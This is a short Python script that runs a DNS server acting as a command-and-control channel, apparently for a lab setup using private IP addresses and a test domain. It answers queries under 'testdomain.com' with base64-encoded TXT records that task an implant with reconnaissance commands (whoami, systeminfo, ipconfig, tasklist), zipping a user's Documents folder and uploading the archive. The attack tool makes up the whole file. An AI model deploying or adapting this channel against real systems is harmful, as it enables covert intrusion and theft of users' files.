from dnslib.server import DNSServer, BaseResolver
from dnslib import RR, QTYPE, A, TXT
import base64

LISTEN_IP = "192.168.56.102"
LISTEN_PORT = 53

RETURN_IP = "192.168.1.100"
TARGET_DOMAIN = "testdomain.com."

MESSAGES = [
    "hostname",
    "whoami",
    "systeminfo",
    "ipconfig /all",
    "tasklist",
    "powershell Get-Process",
    r"dir C:\Users",
    r"Compress-Archive C:\Users\Alice\Documents",
    "Upload archive",
    "Sleep 300"
]

class Resolver(BaseResolver):

    def __init__(self):
        self.message_index = 0

    def get_next_message(self):
        message = MESSAGES[self.message_index]
        self.message_index = (self.message_index + 1) % len(MESSAGES)
        return message

    def resolve(self, request, handler):

        reply = request.reply()

        qname = request.q.qname
        qtype = QTYPE[request.q.qtype]
        domain = str(qname).lower()

        print(f"\nReceived {qtype} request")
        print(domain)

        if domain.endswith(TARGET_DOMAIN):

            message = self.get_next_message()

            # Base64 URL-safe encode the message
            encoded_message = base64.urlsafe_b64encode(
                message.encode()
            ).decode()

            print(f"Sending: {message}")
            print(f"Encoded: {encoded_message}")

            # A Record
            reply.add_answer(
                RR(
                    qname,
                    QTYPE.A,
                    ttl=60,
                    rdata=A(RETURN_IP)
                )
            )

            # TXT Record
            reply.add_answer(
                RR(
                    qname,
                    QTYPE.TXT,
                    ttl=60,
                    rdata=TXT(encoded_message)
                )
            )

        return reply


resolver = Resolver()

server = DNSServer(
    resolver,
    address=LISTEN_IP,
    port=LISTEN_PORT,
    tcp=False
)

print(f"DNS Server listening on {LISTEN_IP}:{LISTEN_PORT}")

server.start()
